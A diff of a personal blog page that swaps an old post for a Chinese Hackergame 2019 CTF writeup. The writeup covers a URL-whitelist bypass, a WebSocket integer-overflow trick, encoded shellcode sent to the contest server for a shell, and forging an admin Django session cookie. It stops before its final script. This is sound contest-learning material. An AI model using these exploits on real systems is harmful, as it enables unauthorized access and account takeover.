@@ -7,17 +7,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://blog.xhyeax.com">
-  <title>Xhy&#39;s Blog</title>
+  <title>Hackersgame 2019 部分writeup | Xhy&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Blog of XhyEax, Share and make progress together.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Xhy&#39;s Blog">
-<meta property="og:url" content="http://blog.xhyeax.com/index.html">
+  <meta name="description" content="签到题修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面即可点击提交按钮得到flag 白与夜图片是qq中常见的隐藏图，个人做这题时是用的手机直接使用自带相册打开即可看到flag 信息安全 2077注意到页面源码中设置了If-Unmodified-Since为当前时间，而返回的Last-Modified是Fri, 01 Oct 2077 00:00:00">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackersgame 2019 部分writeup">
+<meta property="og:url" content="http://blog.xhyeax.com/2019/10/22/hackersgame-2019-writeup/index.html">
 <meta property="og:site_name" content="Xhy&#39;s Blog">
-<meta property="og:description" content="Blog of XhyEax, Share and make progress together.">
+<meta property="og:description" content="签到题修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面即可点击提交按钮得到flag 白与夜图片是qq中常见的隐藏图，个人做这题时是用的手机直接使用自带相册打开即可看到flag 信息安全 2077注意到页面源码中设置了If-Unmodified-Since为当前时间，而返回的Last-Modified是Fri, 01 Oct 2077 00:00:00">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-10-22T01:13:24.411Z">
+<meta property="article:modified_time" content="2021-08-01T03:47:14.089Z">
 <meta property="article:author" content="Xhy">
-<meta property="article:tag" content="XhyEax&#39;s Blog">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Xhy&#39;s Blog" type="application/atom+xml">
@@ -164,23 +166,21 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-gradle-module-build-order-error" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-hackersgame-2019-writeup" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/01/gradle-module-build-order-error/">Gradle app模块构建顺序不符合预期</a>
+    <h1 class="article-title" itemprop="name">
+      Hackersgame 2019 部分writeup
     </h1>
   
 
 
         
-        <a href="/2021/09/01/gradle-module-build-order-error/" class="archive-article-date">
-  	<time datetime="2021-08-31T17:40:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-01</time>
+        <a href="/2019/10/22/hackersgame-2019-writeup/" class="archive-article-date">
+  	<time datetime="2019-10-22T01:13:24.411Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-22</time>
 </a>
         
       </header>
@@ -188,31 +188,106 @@ var _hmt = _hmt || [];
     <div class="article-entry" itemprop="articleBody">
 
       
-    
-        
-        
-            
-            
-        
-            
-            
-        
-            
-            
-        
-        
-            
-            <p><h2 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h2><p>使用<code>Gradle</code>构建安卓项目，第一次构建时报错：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Task :app:buildCMakeDebug FAILED</span><br><span class="line">C/C++: ninja: error: missing and no known rule to make it</span><br></pre></td></tr></table></figure>
+    <h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面<br>即可点击提交按钮得到flag</p>
+<h2 id="白与夜"><a href="#白与夜" class="headerlink" title="白与夜"></a>白与夜</h2><p>图片是qq中常见的隐藏图，个人做这题时是用的手机<br>直接使用自带相册打开即可看到flag</p>
+<h2 id="信息安全-2077"><a href="#信息安全-2077" class="headerlink" title="信息安全 2077"></a>信息安全 2077</h2><p>注意到页面源码中设置了<code>If-Unmodified-Since</code>为当前时间，而返回的<code>Last-Modified</code>是<code>Fri, 01 Oct 2077 00:00:00 GMT</code>，把<code>If-Unmodified-Since</code>改为该值即可获得flag</p>
+<h2 id="宇宙终极问题（部分）"><a href="#宇宙终极问题（部分）" class="headerlink" title="宇宙终极问题（部分）"></a>宇宙终极问题（部分）</h2><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>题目要求给出$x^3+y^3+z^3=42$的整数解，直接百度得到答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（-80538738812075974）^3+80435758145817515^3+12602123297335631^3=42</span><br></pre></td></tr></table></figure>
+<p>输入即可得到flag</p>
+<h2 id="网页读取器"><a href="#网页读取器" class="headerlink" title="网页读取器"></a>网页读取器</h2><p>查看源代码，发现check_hostname时会把@之前的字符删掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hostname</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> whitelist_scheme:</span><br><span class="line">        <span class="keyword">if</span> url.startswith(i):</span><br><span class="line">            url = url[<span class="built_in">len</span>(i):]  <span class="comment"># strip scheme</span></span><br><span class="line">            url = url[url.find(<span class="string">&quot;@&quot;</span>) + <span class="number">1</span>:]  <span class="comment"># strip userinfo</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;/&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;/&quot;</span>)]  <span class="comment"># strip parts after authority</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;:&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;:&quot;</span>)]  <span class="comment"># strip port</span></span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> whitelist_hostname:</span><br><span class="line">                <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;hostname &#123;&#125; not in whitelist&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, <span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;scheme not in whitelist, only &#123;&#125; allowed&quot;</span>.<span class="built_in">format</span>(whitelist_scheme))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造<code>http://web1/flag@example.com</code>提交，发现不对，于是加了个问号<br>即<code>http://web1/flag?@example.com</code>得到flag</p>
+<h2 id="达拉崩吧大冒险"><a href="#达拉崩吧大冒险" class="headerlink" title="达拉崩吧大冒险"></a>达拉崩吧大冒险</h2><p>查看页面源码可知，使用WebSocket进行数据传输，用户端只能发送数字作为当前选项<br>测试发现在料理大市场买鸡时，可以购买负数的鸡（通过控制台<code>ws.send(-1)发现</code>），猜测此处存在负数溢出漏洞。<br>完整流程代码:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ws.send(<span class="number">0</span>);ws.send(<span class="number">0</span>);<span class="comment">//进入[&quot;料理大市场&quot;,&quot;打怪升级&quot;,&quot;去恶龙洞穴&quot;]选项</span></span><br><span class="line">ws.send(<span class="number">0</span>);ws.send(-<span class="number">3223372036854775807</span>);<span class="comment">//选择料理大市场并购买负数只鸡</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//进入恶龙洞穴</span></span><br><span class="line">ws.send(<span class="number">0</span>);<span class="comment">//对话</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//得到flag</span></span><br></pre></td></tr></table></figure>
+<p>此处使用的负数是<code>MAX_INT64</code> (<code>9223372036854775807</code>)的最高位改成3，一次即可溢出成功，攻击变成了<code>2329883889435671600</code></p>
+<h2 id="Happy-LUG"><a href="#Happy-LUG" class="headerlink" title="Happy LUG"></a>Happy LUG</h2><p>??的Punycode编码是<code>xn--g28h</code>，故组合起来的域名为<br><code>xn--g28h.hack.ustclug.org</code><br>查询该域名的txt记录即可得到flag（手机端可使用<code>Network Tools</code>进行查询）</p>
+<h2 id="正则验证器"><a href="#正则验证器" class="headerlink" title="正则验证器"></a>正则验证器</h2><p>题目说需要找到运行时间超过一秒的正则表达式，查看源码发现还有长度限制<br>正则表达式长度不能大于6，匹配的文本长度不能大于24<br>个人直接百度找到了答案:<br><a target="_blank" rel="noopener" href="http://ju.outofmemory.cn/entry/82230">如何中断一个长时间运行的“无限”Java正则表达式</a><br>正则：<code>(0*)*A</code>，字符：<code>00000000000000000000000</code><br>提交得到flag</p>
+<h2 id="小巧玲珑的-ELF"><a href="#小巧玲珑的-ELF" class="headerlink" title="小巧玲珑的 ELF"></a>小巧玲珑的 ELF</h2><p>IDA打开，查看伪代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_read</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">45</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[i] += <span class="number">2</span> * i;</span><br><span class="line">    buf[i] ^= i;</span><br><span class="line">    buf[i] -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">45</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[j] != *(&amp;v0 + j) )</span><br><span class="line">      __asm &#123; syscall; LINUX - sys_exit &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_exit</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中v0到v45是数据段，需要dump出来（建议使用脚本）<br>这题有两种解法：爆破或者逆运算得出的flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x83</span>,<span class="number">0x4e</span>,<span class="number">0x6d</span>,<span class="number">0x74</span>,<span class="number">0x85</span>,<span class="number">0x7a</span>,<span class="number">0x6f</span>,<span class="number">0x57</span>,<span class="number">0x91</span>,<span class="number">0x73</span>,<span class="number">0x90</span>,<span class="number">0x4f</span>,<span class="number">0x8d</span>,<span class="number">0x7f</span>,<span class="number">0x63</span>,<span class="number">0x36</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x87</span>,<span class="number">0x69</span>,<span class="number">0xa3</span>,<span class="number">0x6f</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x66</span>,<span class="number">0x56</span>,<span class="number">0x93</span>,<span class="number">0x9f</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x38</span>,<span class="number">0x76</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0x63</span>,<span class="number">0xc4</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0xbe</span>,<span class="number">0xbb</span>,<span class="number">0xcd</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    x = data[i]</span><br><span class="line">    x += i</span><br><span class="line">    x ^= i</span><br><span class="line">    x -= <span class="number">2</span> * i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nbrute&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        tmp_x = x</span><br><span class="line">        x += <span class="number">2</span> * i</span><br><span class="line">        x ^= i</span><br><span class="line">        x -= i</span><br><span class="line">        <span class="keyword">if</span>(x==data[i]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp_x),end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Shell三骇客"><a href="#Shell三骇客" class="headerlink" title="Shell三骇客"></a>Shell三骇客</h2><p>本题是<code>ShellCode</code>构造题，只要传入的<code>ShellCode</code>满足过滤条件就会被执行</p>
+<h3 id="ShellHacker1"><a href="#ShellHacker1" class="headerlink" title="ShellHacker1"></a>ShellHacker1</h3><p>64位程序<br>没有任何过滤，使用<code>pwntools</code>生成<code>shellcode</code>，发送即可</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#print(shellcode)</span></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;chall1&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;202.38.93.241&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">sh.sendline(token)</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ShellHacker2"><a href="#ShellHacker2" class="headerlink" title="ShellHacker2"></a>ShellHacker2</h3><p>32位程序，逆向得知call地址为eax<br>限制输入为数字和大写字母<br>使用<code>msfvenom</code>对shellcode编码<br>得到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA&quot;</span></span><br></pre></td></tr></table></figure>
+<p>发送即可getshell</p>
+<h3 id="ShellHacker3"><a href="#ShellHacker3" class="headerlink" title="ShellHacker3"></a>ShellHacker3</h3><p>64位程序<br>限制输入为可打印字符<br>使用 <a target="_blank" rel="noopener" href="https://github.com/SkyLined/alpha3">ALPHA3</a> 对shellcode编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C&quot;</span></span><br></pre></td></tr></table></figure>
+<p>发送即可getshell</p>
+<h2 id="三教奇妙夜"><a href="#三教奇妙夜" class="headerlink" title="三教奇妙夜"></a>三教奇妙夜</h2><p>解压出一个视频，使用脚本逐帧提取，把0x0为黑色（rgb为[0 0 0]）的图片提取出来<br>然后拼接图片中文字(字体为<code>Dejavu Sans Mono</code>)，即可得到flag</p>
+<h2 id="小-U-的加密"><a href="#小-U-的加密" class="headerlink" title="小 U 的加密"></a>小 U 的加密</h2><p>异或<code>0x39</code>得到一个midi文件(文件头<code>4D 54 68 64</code>)，使用<code>Audacity</code>打开得到flag<br>注：flag 中的字符串全部为英文小写字符。</p>
+<h2 id="献给最好的你"><a href="#献给最好的你" class="headerlink" title="献给最好的你"></a>献给最好的你</h2><p>反编译，定位到<code>com.hackergame.eternalEasterlyWind.data.LoginDataSource</code>类中的<code>login</code>方法<br>大致流程为：<br>对输入的密码进行base64编码，然后把该字符串大小写互转，与<code>pass1</code>:<code>AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==</code>进行对比<br>一致则进入下一流程：<br>调用<code>logout</code>函数对<code>rawpassword</code>和一个自己数组进行运算，得到flag<br>所以对<code>pass1</code>进行大小写互转操作，得到<code>hackergame2019withfun!</code><br>输入即可得到flag<br>（个人是把代码copy出来，直接调用<code>logout</code>函数输出的）</p>
+<h2 id="我想要个家"><a href="#我想要个家" class="headerlink" title="我想要个家"></a>我想要个家</h2><blockquote>
+<p>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。</p>
+</blockquote>
+<h3 id="一开始的尝试"><a href="#一开始的尝试" class="headerlink" title="一开始的尝试"></a>一开始的尝试</h3><p>首先建立一个文件夹，作为程序执行的根目录（以yourhome为例）<br>并保证只存在这四个目录<code>/Kitchen /Lavatory /Bedroom /Living_Room]</code><br>然后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /yourhome/ ./IWantAHome-linux</span><br></pre></td></tr></table></figure>
+<p>然后要求<code>/Bedroom/</code>下的<code>Microphone</code>和<code>Headset</code>的内容一致，考察链接的建立，执行语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln Microphone Headset</span><br></pre></td></tr></table></figure>
+<p>然后要求<code>/Living_Room</code>中有一个记录当前时间(格式<code>20:15:30</code>)的<code>Clock</code>文件<br>写个脚本循环输出时间到该文件，另开终端运行，然后重新运行<code>IWantAHome-linux</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">date &quot;+%H:%M:%S&quot; &gt; /yourhome/Living_Room/Clock</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>然后要求输入<code>sleep 10 seconds in shell</code>的命令，输入<code>sleep 10</code>提示环境变量中找不到该可执行文件，可见并不是字符串判断<br>于是添加sleep到根目录，执行<code>./sleep 10</code>，提示找不到<code>/dev/null</code>，添加该文件后还是报错，提示<code>fork/exec ./sleep: no such file or directory</code><br>各种尝试，最后还是选择逆向了</p>
+<h3 id="逆向做法"><a href="#逆向做法" class="headerlink" title="逆向做法"></a>逆向做法</h3><p>使用IDA64打开该文件，利用<code>IDAGolangHelper</code>脚本恢复函数名，找到<code>main_main</code>函数，修改执行流程，直接输出flag</p>
+<h2 id="被泄漏的姜戈"><a href="#被泄漏的姜戈" class="headerlink" title="被泄漏的姜戈"></a>被泄漏的姜戈</h2><p>在<code>github</code>找到用户<code>openlug</code>创建的库:<a target="_blank" rel="noopener" href="https://github.com/openlug/django-common">https://github.com/openlug/django-common</a><br>git clone下来，查看<code>app/views.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> authenticate, login, logout</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;Rabbit House 成员管理系统&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.user.is_authenticated:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;app/index.html&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: name</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.POST[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.POST[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        user = authenticate(request, username=username, password=password)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            login(request, user)</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.user.username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;flag redacted. login as admin on server to get flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;仅 admin 用户可阅览 flag。&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;app/profile.html&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: request.user,</span><br><span class="line">        <span class="string">&quot;profile&quot;</span>: user_profile</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_out</span>(<span class="params">request</span>):</span></span><br><span class="line">    logout(request)</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_last_login</span>(<span class="params">sender, user, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">models.update_last_login = update_last_login</span><br></pre></td></tr></table></figure>
+<p>关键在于<code>if request.user.username == &quot;admin&quot;:</code>判断，要让当前用户的用户名为<code>admin</code>，推测是Cookie欺骗<br>对Cookie进行解密（完整代码见后文）得到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_auth_user_id&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;_auth_user_backend&#x27;</span>: <span class="string">&#x27;django.contrib.auth.backends.ModelBackend&#x27;</span>, <span class="string">&#x27;_auth_user_hash&#x27;</span>: <span class="string">&#x27;0a884f8b987fca1a92c6f93d9042d83eea72d98d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>查看Django源码得知，<code>_auth_user_backend</code>默认只有这一种，所以肯定是对<code>_auth_user_id</code>和<code>_auth_user_hash</code>进行替换<br>直接把<code>_auth_user_id</code>改为<code>1</code>，发现返回302跳转，所以应该还要得出admin的<code>_auth_user_hash</code>值</p>
+<p>源码中有数据库文件<code>db.sqlite3</code>，查看发现其中有<code>pbkdf2_sha256</code>加密后的密码<br><code>admin</code>: <code>pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=</code><br><code>guest</code>: <code>pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=</code><br>找到生成<code>_auth_user_hash</code>的代码(<code>django.contrib.auth.bast_user.py</code>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session_auth_hash</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Return an HMAC of the password field.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key_salt = <span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span></span><br><span class="line">    <span class="keyword">return</span> salted_hmac(key_salt, self.password).hexdigest()</span><br></pre></td></tr></table></figure>
+<p>copy出来，利用加密后的密码生成哈希值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">hash1 = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash1)</span><br></pre></td></tr></table></figure>
+<p>得到<code>0a884f8b987fca1a92c6f93d9042d83eea72d98d</code>，恰好是解密出的<code>_auth_user_hash</code>值，验证算法成功<br>然后修改<code>_auth_user_id</code>和<code>_auth_user_hash</code>，加密生成Cookie，requests.get即可<br>完整脚本（放置在<code>openlug/</code>下）：</p>
